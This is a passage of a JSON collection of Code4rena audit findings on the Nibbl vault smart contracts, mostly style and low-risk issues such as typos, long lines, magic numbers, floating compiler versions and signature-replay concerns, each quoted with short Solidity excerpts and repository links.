      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42704",
      "title": "[N-18] File is missing NatSpec",
      "impact": "LOW",
      "content": "\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/Utilities/EIP712Base.sol (various lines)   #1\n\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Utilities/EIP712Base.sol>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42703",
      "title": "[N-17] Typos",
      "impact": "LOW",
      "content": "\n*There are 14 instances of this issue:*\n\n```solidity\nFile: contracts/NibblVault.sol\n\n/// @audit reenterancy\n125:      ///@notice reenterancy guard\n\n/// @audit pausablity\n152:      /// @dev pausablity implemented in factory\n\n/// @audit primaryReseveRatio\n200:          //curator fee is proportional to the secondary reserve ratio/primaryReseveRatio i.e. initial liquidity added by curator\n\n/// @audit primaryReseveRatio\n201:          curatorFee = (((_secondaryReserveRatio - MIN_SECONDARY_RESERVE_RATIO) * MIN_CURATOR_FEE) / (primaryReserveRatio - MIN_SECONDARY_RESERVE_RATIO)) + MIN_CURATOR_FEE; //curator fee is proportional to the secondary reserve ratio/primaryReseveRatio i.e. initial liquidity added by curator\n\n/// @audit continous\n250:      /// @dev The max continous tokens on SecondaryCurve is equal to initialTokenSupply\n\n/// @audit seconday\n263:      /// @dev Valuation = If current supply is on seconday curve we use secondaryReserveBalance and secondaryReserveRatio to calculate valuation else we use primary reserve ratio and balance\n\n/// @audit continous\n270:      /// @param _amount amount of reserve tokens to buy continous tokens\n\n/// @audit continous\n282:      /// @param _amount amount of reserve tokens to buy continous tokens\n\n/// @audit Continous\n359:      /// @param _amtIn Continous Tokens to be sold\n\n/// @audit recieve\n361:      /// @param _to Address to recieve the reserve token to\n\n/// @audit airdops\n512:      /// @notice ERC20s can be accumulated by the underlying ERC721 in the vault as royalty or airdops \n\n/// @audit airdops\n531:      /// @notice ERC1155s can be accumulated by the underlying ERC721 in the vault as royalty or airdops \n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L125>\n\n```solidity\nFile: contracts/Proxy/ProxyBasket.sol\n\n/// @audit internall\n26:        * This function does not return to its internall call site, it will return directly to the external caller.\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Proxy/ProxyBasket.sol#L26>\n\n```solidity\nFile: contracts/Proxy/ProxyVault.sol\n\n/// @audit internall\n26:        * This function does not return to its internall call site, it will return directly to the external caller.\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Proxy/ProxyVault.sol#L26>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42702",
      "title": "[N-16] Non-library/interface files should use fixed compiler versions, not floating ones",
      "impact": "LOW",
      "content": "\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/Utilities/AccessControlMechanism.sol   #1\n\n4:    pragma solidity ^0.8.0;\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Utilities/AccessControlMechanism.sol#L4>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42701",
      "title": "[N-15] Lines are too long",
      "impact": "LOW",
      "content": "\nUsually lines in source code are limited to [80](https://softwareengineering.stackexchange.com/questions/148677/why-is-80-characters-the-standard-limit-for-code-width) characters. Today's screens are much larger so it's reasonable to stretch this in some cases. Since the files will most likely reside in GitHub, and GitHub starts using a scroll bar in all cases when the length is over [164](https://github.com/aizatto/character-length) characters, the lines below should be split when they reach that length\n\n*There are 14 instances of this issue:*\n\n```solidity\nFile: contracts/Basket.sol\n\n109:      function onERC1155BatchReceived(address, address from, uint256[] memory ids, uint256[] memory amounts, bytes memory) external virtual override returns (bytes4) {\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L109>\n\n```solidity\nFile: contracts/NibblVaultFactory.sol\n\n50:           _proxyVault = payable(new ProxyVault{salt: keccak256(abi.encodePacked(_curator, _assetAddress, _assetTokenID, _initialSupply, _initialTokenPrice))}(payable(address(this))));\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L50>\n\n```solidity\nFile: contracts/NibblVault.sol\n\n19:   /// @dev The secondary curve is dynamic and has a variable reserveRatio, which depends on initial conditions given by the curator and the fee accumulated by the curve.\n\n79:       /// @dev This variable also defines the amount of reserve token that should be in the primary curve if the primary curve started from 0 and went till initialTokenSupply \n\n201:          curatorFee = (((_secondaryReserveRatio - MIN_SECONDARY_RESERVE_RATIO) * MIN_CURATOR_FEE) / (primaryReserveRatio - MIN_SECONDARY_RESERVE_RATIO)) + MIN_CURATOR_FEE; //curator fee is proportional to the secondary reserve ratio/primaryReseveRatio i.e. initial liquidity added by curator\n\n224:          _feeCurve = _maxSecondaryBalanceIncrease > _feeCurve ? _feeCurve : _maxSecondaryBalanceIncrease; // the curve fee is capped so that secondaryReserveBalance <= fictitiousPrimaryReserveBalance\n\n226:          secondaryReserveRatio = uint32((secondaryReserveBalance * SCALE * 1e18) / (initialTokenSupply * initialTokenPrice)); //secondaryReserveRatio is updated on every trade \n\n263:      /// @dev Valuation = If current supply is on seconday curve we use secondaryReserveBalance and secondaryReserveRatio to calculate valuation else we use primary reserve ratio and balance\n\n266:              return totalSupply() < initialTokenSupply ? (secondaryReserveBalance * SCALE /secondaryReserveRatio) : ((primaryReserveBalance) * SCALE  / primaryReserveRatio);\n\n297:      /// @dev if current totalSupply < initialTokenSupply AND _amount to buy tokens for is greater than (maxSecondaryCurveBalance - currentSecondaryCurveBalance) then buy happens on secondary curve and primary curve both\n\n358:      /// @dev if totalSupply > initialTokenSupply AND _amount to sell is greater than (_amtIn > totalSupply - initialTokenSupply) then sell happens on primary curve and secondary curve both\n\n395:      /// @dev bidder needs to send funds equal to current valuation - ((primaryReserveBalance - fictitiousPrimaryReserveBalance) + secondaryReserveBalance) to initiate buyout\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L19>\n\n```solidity\nFile: contracts/Twav/Twav.sol\n\n28:           twavObservations[twavObservationsIndex] = TwavObservation(_blockTimestamp, _prevCumulativeValuation + (_valuation * _timeElapsed)); //add the previous observation to make it cumulative\n\n40:               _twav = (_twavObservationCurrent.cumulativeValuation - _twavObservationPrev.cumulativeValuation) / (_twavObservationCurrent.timestamp - _twavObservationPrev.timestamp);\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Twav/Twav.sol#L28>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42700",
      "title": "[N-14] Inconsistent spacing in comments",
      "impact": "LOW",
      "content": "\nSome lines use `// x` and some use `//x`. The instances below point out the usages that don't follow the majority, within each file\n\n*There are 27 instances of this issue:*\n\n```solidity\nFile: contracts/NibblVault.sol\n\n28:       uint32 private constant primaryReserveRatio = 200_000; //20%\n\n34:       uint256 private constant REJECTION_PREMIUM = 150_000; //15%\n\n46:       uint256 private constant MIN_CURATOR_FEE = 5_000; //0.5%\n\n122:      ///@notice current status of vault\n\n125:      ///@notice reenterancy guard\n\n200:          //curator fee is proportional to the secondary reserve ratio/primaryReseveRatio i.e. initial liquidity added by curator\n\n201:          curatorFee = (((_secondaryReserveRatio - MIN_SECONDARY_RESERVE_RATIO) * MIN_CURATOR_FEE) / (primaryReserveRatio - MIN_SECONDARY_RESERVE_RATIO)) + MIN_CURATOR_FEE; //curator fee is proportional to the secondary reserve ratio/primaryReseveRatio i.e. initial liquidity added by curator\n\n220:          //_maxSecondaryBalanceIncrease: is the max amount of secondary reserve balance that can be added to the vault\n\n221:          //_maxSecondaryBalanceIncrease cannot be more than fictitiousPrimaryReserveBalance\n\n226:          secondaryReserveRatio = uint32((secondaryReserveBalance * SCALE * 1e18) / (initialTokenSupply * initialTokenPrice)); //secondaryReserveRatio is updated on every trade \n\n228:              safeTransferETH(_factory, _feeAdmin); //Transfers admin fee to the factory contract\n\n244:              safeTransferETH(_factory, _feeAdmin); //Transfers admin fee to the factory contract\n\n301:          //Make update on the first tx of the block\n\n318:                  //Gas Optimization\n\n363:          //Make update on the first tx of the block\n\n368:                  _rejectBuyout(); //For the case when TWAV goes up when updated on sell\n\n377:                  //Gas Optimization\n\n389:          safeTransferETH(_to, _saleReturn); //send _saleReturn to _to\n\n402:          //_buyoutBid: Bid User has made\n\n448:              _rejectBuyout(); //For the case when TWAV goes up when updated externally\n\n500:      ///@notice withdraw multiple ERC721s\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L28>\n\n```solidity\nFile: contracts/Proxy/ProxyBasket.sol\n\n28:       //solhint-disable-next-line no-complex-fallback\n\n31:           //solhint-disable-next-line no-inline-assembly\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Proxy/ProxyBasket.sol#L28>\n\n```solidity\nFile: contracts/Proxy/ProxyVault.sol\n\n28:       //solhint-disable-next-line no-complex-fallback\n\n31:           //solhint-disable-next-line no-inline-assembly\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Proxy/ProxyVault.sol#L28>\n\n```solidity\nFile: contracts/Twav/Twav.sol\n\n12:       uint8 private constant TWAV_BLOCK_NUMBERS = 4; //TWAV of last 4 Blocks \n\n28:           twavObservations[twavObservationsIndex] = TwavObservation(_blockTimestamp, _prevCumulativeValuation + (_valuation * _timeElapsed)); //add the previous observation to make it cumulative\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Twav/Twav.sol#L12>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42699",
      "title": "[N-13] Expressions for constant values such as a call to `keccak256()`, should use `immutable` rather than `constant`",
      "impact": "LOW",
      "content": "\n*There are 5 instances of this issue:*\n\n```solidity\nFile: contracts/NibblVault.sol\n\n51:       bytes32 private constant PERMIT_TYPEHASH = keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\");\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L51>\n\n```solidity\nFile: contracts/Utilities/AccessControlMechanism.sol\n\n12:       bytes32 public constant FEE_ROLE = keccak256(\"FEE_ROLE\");\n\n13:       bytes32 public constant PAUSER_ROLE = keccak256(\"PAUSER_ROLE\");\n\n14:       bytes32 public constant IMPLEMENTER_ROLE = keccak256(\"IMPLEMENTER_ROLE\");\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Utilities/AccessControlMechanism.sol#L12>\n\n```solidity\nFile: contracts/Utilities/EIP712Base.sol\n\n7         bytes32 internal constant EIP712_DOMAIN_TYPEHASH = keccak256(\n8             bytes(\n9                 \"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\"\n10            )\n11:       );\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Utilities/EIP712Base.sol#L7-L11>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42698",
      "title": "[N-12] Missing event and or timelock for critical parameter change",
      "impact": "LOW",
      "content": "\nEvents help non-contract tools to track changes, and events prevent users from being surprised by changes\n\n*There are 4 instances of this issue:*\n\n```solidity\nFile: contracts/NibblVault.sol   #1\n\n485       function updateCurator(address _newCurator) external override {\n486           require(msg.sender == curator,\"NibblVault: Only Curator\");\n487           curator = _newCurator;\n488:      }\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L485-L488>\n\n```solidity\nFile: contracts/NibblVaultFactory.sol   #2\n\n100:         pendingBasketImplementation = _newBasketImplementation;\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L100>\n\n```solidity\nFile: contracts/NibblVaultFactory.sol   #3\n\n124:         pendingFeeTo = _newFeeAddress;\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L124>\n\n```solidity\nFile: contracts/NibblVaultFactory.sol   #4\n\n159:         pendingVaultImplementation = _newVaultImplementation;\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L159>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42697",
      "title": "[N-11] Cast is more restrictive than the type of the variable being assigned",
      "impact": "LOW",
      "content": "\nIf `address foo` is being used in an expression such as `IERC20 token = FooToken(foo)`, then the more specific cast to `FooToken` is a waste because the only thing the compiler will check for is that `FooToken` extends `IERC20` - it won't check any of the function signatures. Therefore, it makes more sense to do `IERC20 token = IERC20(token)` or better yet `FooToken token = FooToken(foo)`. The former may allow the file in which it's used to remove the import for `FooToken`\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/Proxy/ProxyBasket.sol   #1\n\n/// @audit payable vs address\n20:           implementation = payable(_implementation);\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Proxy/ProxyBasket.sol#L20>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42696",
      "title": "[N-10] `constant`s should be defined rather than using magic numbers",
      "impact": "LOW",
      "content": "\nEven [assembly](https://github.com/code-423n4/2022-05-opensea-seaport/blob/9d7ce4d08bf3c3010304a0476a785c70c0e90ae7/contracts/lib/TokenTransferrer.sol#L35-L39) can benefit from using readable constants instead of hex/numeric literals\n\n*There are 10 instances of this issue:*\n\n```solidity\nFile: contracts/NibblVaultFactory.sol\n\n/// @audit 0xff\n72:           bytes32 _hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), newsalt, keccak256(code)));\n\n/// @audit 0xff\n91:           bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), newsalt, keccak256(code)));\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L72>\n\n```solidity\nFile: contracts/NibblVault.sol\n\n/// @audit 1e18\n183:          uint32 _secondaryReserveRatio = uint32((msg.value * SCALE * 1e18) / (_initialTokenSupply * _initialTokenPrice));\n\n/// @audit 1e18\n195:          uint _primaryReserveBalance = (primaryReserveRatio * _initialTokenSupply * _initialTokenPrice) / (SCALE * 1e18);\n\n/// @audit 1e18\n226:          secondaryReserveRatio = uint32((secondaryReserveBalance * SCALE * 1e18) / (initialTokenSupply * initialTokenPrice)); //secondaryReserveRatio is updated on every trade \n\n/// @audit 1e18\n253:              return ((secondaryReserveRatio * initialTokenSupply * initialTokenPrice) / (1e18 * SCALE));\n\n/// @audit 32\n303:              uint32 _blockTimestamp = uint32(block.timestamp % 2**32);\n\n/// @audit 32\n365:              uint32 _blockTimestamp = uint32(block.timestamp % 2**32);\n\n/// @audit 32\n413:          _updateTWAV(_currentValuation, uint32(block.timestamp % 2**32));\n\n/// @audit 32\n445:          uint32 _blockTimestamp = uint32(block.timestamp % 2**32);\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L183>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42695",
      "title": "[N-09] `2**<n> - 1` should be re-written as `type(uint<n>).max`",
      "impact": "LOW",
      "content": "\nEarlier versions of solidity can use `uint<n>(-1)` instead. Expressions not including the `- 1` can often be re-written to accomodate the change (e.g. by using a `>` rather than a `>=`, which will also save some gas)\n\n*There are 4 instances of this issue:*\n\n```solidity\nFile: contracts/NibblVault.sol   #1\n\n303:              uint32 _blockTimestamp = uint32(block.timestamp % 2**32);\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L303>\n\n```solidity\nFile: contracts/NibblVault.sol   #2\n\n365:              uint32 _blockTimestamp = uint32(block.timestamp % 2**32);\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L365>\n\n```solidity\nFile: contracts/NibblVault.sol   #3\n\n413:          _updateTWAV(_currentValuation, uint32(block.timestamp % 2**32));\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L413>\n\n```solidity\nFile: contracts/NibblVault.sol   #4\n\n445:          uint32 _blockTimestamp = uint32(block.timestamp % 2**32);\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L445>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42694",
      "title": "[N-08] Non-assembly method available",
      "impact": "LOW",
      "content": "\n`assembly{ id := chainid() }` => `uint256 id = block.chainid`, `assembly { size := extcodesize() }` => `uint256 size = address().code.length`\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/Utilities/EIP712Base.sol   #1\n\n29:               id := chainid()\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Utilities/EIP712Base.sol#L29>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42693",
      "title": "[N-07] `public` functions not called by the contract should be declared `external` instead",
      "impact": "LOW",
      "content": "\nContracts [are allowed](https://docs.soliditylang.org/en/latest/contracts.html#function-overriding) to override their parents' functions and change the visibility from `external` to `public`.\n\n*There are 3 instances of this issue:*\n\n```solidity\nFile: contracts/NibblVaultFactory.sol   #1\n\n64        function getVaultAddress(\n65            address _curator,\n66            address _assetAddress,\n67            uint256 _assetTokenID,\n68            uint256 _initialSupply,\n69:           uint256 _initialTokenPrice) public view returns(address _vault) {\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L64-L69>\n\n```solidity\nFile: contracts/NibblVaultFactory.sol   #2\n\n76:       function getVaults() public view returns(ProxyVault[] memory ) {\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L76>\n\n```solidity\nFile: contracts/Twav/Twav.sol   #3\n\n44:       function getTwavObservations() public view returns(TwavObservation[TWAV_BLOCK_NUMBERS] memory) {\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Twav/Twav.sol#L44>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42692",
      "title": "[N-06] `require()`/`revert()` statements should have descriptive reason strings",
      "impact": "LOW",
      "content": "\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/NibblVaultFactory.sol   #1\n\n114:          require(_success);\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L114>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42691",
      "title": "[N-05] Contract implements interface without extending the interface",
      "impact": "LOW",
      "content": "\nNot extending the interface may lead to the wrong function signature being used, leading to unexpected behavior. If the interface is in fact being implemented, use the `override` keyword to indicate that fact\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/NibblVault.sol   #1\n\n/// @audit onERC721Received(), onERC1155Received()\n20:   contract NibblVault is INibblVault, BancorFormula, ERC20Upgradeable, Twav, EIP712Base {\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L20>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42690",
      "title": "[N-04] Missing `initializer` modifier on constructor",
      "impact": "LOW",
      "content": "\nOpenZeppelin [recommends](https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680/5) that the `initializer` modifier be applied to constructors in order to avoid potential griefs, [social engineering](https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680/4), or exploits. Ensure that the modifier is applied to the implementation contract. If the default constructor is currently being used, it should be changed to be an explicit one with the modifier applied.\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/Basket.sol   #1\n\n13:   contract Basket is IBasket, ERC721(\"NFT Basket\", \"NFTB\"), Initializable {\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L13>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42689",
      "title": "[N-03] Inconsistent version of English being used",
      "impact": "LOW",
      "content": "\nSome functions use American English, whereas others use British English. A single project should use only one of the two\n\n*There are 2 instances of this issue:*\n\n```solidity\nFile: contracts/NibblVault.sol   #1\n\n173:     function initialize(\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L173>\n\n```solidity\nFile: contracts/Interfaces/IBasket.sol   #2\n\n10:      function initialise(address _curator) external;\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Interfaces/IBasket.sol#L10>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42688",
      "title": "[N-02] Misleading variable name",
      "impact": "LOW",
      "content": "\n`_twavObservationPrev` is not the previous observation - it's more like the trailing, or next-to-expire TWAV observation\\`\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/Twav/Twav.sol   #1\n\n39:              TwavObservation memory _twavObservationPrev = twavObservations[(_index + 1) % TWAV_BLOCK_NUMBERS];\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Twav/Twav.sol#L39>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42687",
      "title": "[N-01] Consider addings checks for signature malleability",
      "impact": "LOW",
      "content": "\nUse OpenZeppelin's `ECDSA` contract rather than calling `ecrecover()` directly\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/NibblVault.sol   #1\n\n563:         address signer = ecrecover(toTypedMessageHash(structHash), v, r, s);\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L563>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42686",
      "title": "[L-08] Upgradeable contract is missing a `__gap[50]` storage variable to allow for new storage variables in later versions",
      "impact": "LOW",
      "content": "\nSee [this](https://docs.openzeppelin.com/contracts/4.x/upgradeable#storage_gaps) link for a description of this storage variable. While some contracts may not currently be sub-classed, adding the variable now protects against forgetting to add it in the future.\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/NibblVault.sol   #1\n\n20:   contract NibblVault is INibblVault, BancorFormula, ERC20Upgradeable, Twav, EIP712Base {\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L20>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42685",
      "title": "[L-07] Vulnerable to cross-chain replay attacks due to static `DOMAIN_SEPARATOR`/`domainSeparator`",
      "impact": "LOW",
      "content": "\nSee [this](https://github.com/code-423n4/2021-04-maple-findings/issues/2) issue from a prior contest for details\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/Utilities/EIP712Base.sol   #1\n\n15       function INIT_EIP712(string memory name, string memory version) internal {\n16           domainSeperator = keccak256(\n17               abi.encode(\n18                   EIP712_DOMAIN_TYPEHASH,\n19                   keccak256(bytes(name)),\n20                   keccak256(bytes(version)),\n21                   getChainID(),\n22                   address(this)\n23               )\n24           );\n25:      }\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Utilities/EIP712Base.sol#L15-L25>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42684",
      "title": "[L-06] Missing checks for `address(0x0)` when assigning values to `address` state variables",
      "impact": "LOW",
